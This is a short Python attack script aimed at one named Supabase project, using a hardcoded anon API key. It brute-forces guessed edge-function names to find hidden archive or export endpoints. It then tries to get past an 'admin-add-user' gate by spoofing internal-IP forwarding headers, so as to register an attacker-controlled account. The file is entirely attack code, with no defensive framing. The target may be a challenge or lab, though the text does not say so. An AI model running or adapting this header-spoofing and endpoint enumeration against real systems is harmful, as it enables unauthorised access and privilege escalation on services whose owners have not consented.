import urllib.request, urllib.error, ssl, json

BASE="https://iuqrarlmvuydxhiygkro.supabase.co"
ANON="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Iml1cXJhcmxtdnV5ZHhoaXlna3JvIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzAzODI2NzUsImV4cCI6MjA4NTk1ODY3NX0.DCWPItRMC2aekqWjFoTGoROzzmR_q2uy2NjJK-nAxLg"
ctx=ssl.create_default_context()

def call(fn, body=None, extra=None, method="POST"):
    url=f"{BASE}/functions/v1/{fn}"
    data=json.dumps(body or {}).encode() if method=="POST" else None
    h={"apikey":ANON,"Authorization":f"Bearer {ANON}","Content-Type":"application/json"}
    if extra: h.update(extra)
    r=urllib.request.Request(url, data=data, method=method, headers=h)
    try:
        resp=urllib.request.urlopen(r,timeout=15,context=ctx); return resp.status, resp.read().decode("utf-8","replace")
    except urllib.error.HTTPError as e: return e.code, e.read().decode("utf-8","replace")
    except Exception as e: return "ERR", str(e)

# 1) enumerate archive/internal/data edge functions
print("=== enumerate archive-ish functions ===")
for fn in ["archive","data-archive","get-archive","internal","internal-api","inventory",
           "export-data","backup","dump","records","dossier","data","get-data","vault",
           "t-484","t484","restricted","read-archive","archive-api"]:
    s,o=call(fn, {})
    if not (s==404 and "NOT_FOUND" in o):
        print(f"  {fn}: {s} {o[:120]}  <<< EXISTS")
    else:
        print(f"  {fn}: 404")

# 2) header-spoof the gate (admin-add-user) with internal-origin header pairs
print("\n=== admin-add-user with internal-origin headers ===")
ips=["127.0.0.1","10.44.7.21","172.18.4.37","::1"]
pairs=[("X-Forwarded-For","X-Real-IP"),("X-Forwarded-For","X-Forwarded-Host"),
       ("X-Forwarded-For","X-Client-IP"),("X-Forwarded-For","CF-Connecting-IP"),
       ("X-Forwarded-For","True-Client-IP"),("X-Real-IP","X-Forwarded-For")]
body={"email":"pwn-internal@attacker.test","name":"x"}
for ip in ips[:2]:
    for h1,h2 in pairs:
        s,o=call("admin-add-user", body, {h1:ip,h2:ip})
        if "Forbidden" not in o:
            print(f"  [{h1}+{h2}={ip}] {s} {o[:160]}  <<< CHANGED")
# baseline
s,o=call("admin-add-user", body, {})
print(f"  baseline(no hdrs): {s} {o[:80]}")
